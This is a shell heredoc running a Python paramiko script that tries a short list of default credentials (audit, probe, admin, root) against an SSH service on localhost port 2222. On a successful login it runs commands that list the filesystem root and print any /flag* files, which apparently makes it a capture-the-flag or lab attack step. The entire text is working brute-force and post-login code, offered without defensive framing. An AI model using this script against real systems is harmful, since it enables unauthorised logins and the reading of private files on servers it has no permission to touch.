python3 - <<'EOF'
import paramiko, time
host, port = "127.0.0.1", 2222
creds = [("audit","audit"),("audit","probe"),("probe","audit"),
         ("probe","probe"),("admin","admin"),("root","root")]
for u, p in creds:
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # in-memory only, no disk writes
    t0 = time.time()
    try:
        c.connect(host, port=port, username=u, password=p, timeout=3,
                  allow_agent=False, look_for_keys=False,
                  banner_timeout=3, auth_timeout=3)
        print(f"[+] AUTH SUCCESS {u}:{p} ({(time.time()-t0)*1000:.0f} ms)")
        try:
            _, o, _ = c.exec_command("id; ls -la /; cat /flag* 2>/dev/null", timeout=3)
            print(o.read().decode(errors="replace")[:3000])
        except Exception as e:
            print("    exec failed:", type(e).__name__, e)
        c.close()
        break
    except paramiko.AuthenticationException:
        print(f"[-] rejected {u}:{p} ({(time.time()-t0)*1000:.0f} ms)")
        c.close()
    except Exception as e:
        print(f"[!] {u}:{p} -> {type(e).__name__}: {e}")
        try: c.close()
        except Exception: pass
print("done")
EOF
